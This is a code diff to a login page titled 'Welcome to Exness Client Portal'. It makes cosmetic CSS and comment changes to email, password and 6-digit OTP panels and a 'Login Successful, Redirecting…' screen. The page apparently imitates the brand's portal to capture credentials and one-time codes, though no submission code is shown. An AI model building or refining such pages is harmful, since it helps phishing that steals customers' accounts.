@@ -12,6 +12,7 @@ body {
   padding: 0;
   background: #f5f5f5;
   font-family: Arial, sans-serif;
+  color: #111;
 }
 
 .container {
@@ -24,27 +25,26 @@ body {
   background: #fff;
   padding: 28px 24px;
   border-radius: 14px;
-  box-shadow: 0 4px 16px rgba(0,0,0,0.1);
+  box-shadow: 0 4px 14px rgba(0,0,0,0.10); /* light shadow */
 }
 
-/* Mobile-friendly logo */
+/* Perfect responsive logo */
 .logo {
   width: 150px;
-  max-width: 55%;
+  max-width: 60%;
   display: block;
   margin: 0 auto 22px;
 }
 
 h2 {
   text-align: center;
-  margin: 0 0 22px;
-  font-size: 23px;
-  font-weight: 600;
+  margin-bottom: 24px;
+  font-size: 22px;
 }
 
 input {
   width: 100%;
-  padding: 13px;
+  padding: 14px;
   margin-bottom: 17px;
   border-radius: 12px;
   border: 1px solid #cfcfcf;
@@ -58,21 +58,22 @@ input:focus {
   outline: none;
 }
 
+/* SIGN IN button black */
 button {
   width: 100%;
   padding: 15px;
-  background: #ffd400;
+  background: #000; /* BLACK */
+  color: #fff;
   border: none;
   border-radius: 12px;
   font-size: 16px;
   font-weight: 600;
   cursor: pointer;
-  margin-top: 5px;
-  transition: background .2s;
+  transition: opacity .2s;
 }
 
 button:hover {
-  background: #f0c600;
+  opacity: 0.85;
 }
 
 .text-center {
@@ -80,8 +81,8 @@ button:hover {
 }
 
 .link {
-  color: #333;
-  font-weight: 500;
+  color: #007bff; /* BLUE register link */
+  font-weight: 600;
   text-decoration: none;
 }
 
@@ -106,10 +107,11 @@ button:hover {
 
 <div class="container">
 
-  <!-- Login Panel -->
+  <!-- LOGIN PAGE -->
   <div id="loginPage" class="card">
     <img src="logo.png" class="logo" alt="Logo">
-     <h1>Welcome to Exness Client Portal</h1>
+
+    <h1>Welcome to Exness Client Portal</h1>
 
     <input id="loginEmail" type="email" placeholder="Email address">
     <input id="loginPassword" type="password" placeholder="Password">
@@ -122,7 +124,7 @@ button:hover {
     </p>
   </div>
 
-  <!-- OTP Panel -->
+  <!-- OTP PAGE -->
   <div id="otpPage" class="card hidden">
     <h2>Enter OTP</h2>
     <input id="otpCode" type="text" maxlength="6" placeholder="6-digit OTP">
@@ -130,7 +132,7 @@ button:hover {
     <button onclick="submitOtp()">Verify OTP</button>
   </div>
 
-  <!-- Success Screen -->
+  <!-- SUCCESS SCREEN -->
   <div id="successPage" class="card hidden">
     <h2>Login Successful</h2>
     <p class="success-text">Redirecting…</p>
